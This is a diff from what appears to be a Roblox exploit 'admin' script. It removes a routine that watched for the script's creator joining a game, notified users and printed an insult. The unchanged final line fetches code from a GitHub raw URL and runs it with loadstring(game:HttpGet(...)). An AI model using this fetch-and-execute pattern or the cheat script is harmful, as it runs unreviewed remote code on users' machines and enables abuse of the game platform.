@@ -13163,44 +13163,4 @@ end
 wait(0.1)
 game:GetService("CoreGui").RobloxGui.NotificationFrame.Visible = false
 
--- Searches for the owner of the script
-local playerToFind = "qipu"
-
-local playerFound = false
-
-local function searchForPlayer()
-  for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-    if player.Name == playerToFind then
-      playerFound = true
-      wait();
-
-Notify({
-Description = "The creator of this admin script (" .. playerToFind .. ") has joined your game";
-Title = "! Owner has joined the game !";
-Duration = 7;
-
-});
-      print("Found player: " .. playerToFind)
-      break
-    end
-  end
-end
-
-searchForPlayer()
-
-local function onPlayerAdded(player)
-  if player.Name == playerToFind then
-    playerFound = true
-    print("the stupid idiot called (" .. playerToFind .. ") has joined your game.")
-     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('', 'All')
-    -- disconnect the event listener to stop checking for the player
-    game:GetService("Players").PlayerAdded:Disconnect(onPlayerAdded)
-  end
-end
-
-while not playerFound do
-  wait(1)
-  searchForPlayer()
-end
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/asd"))();
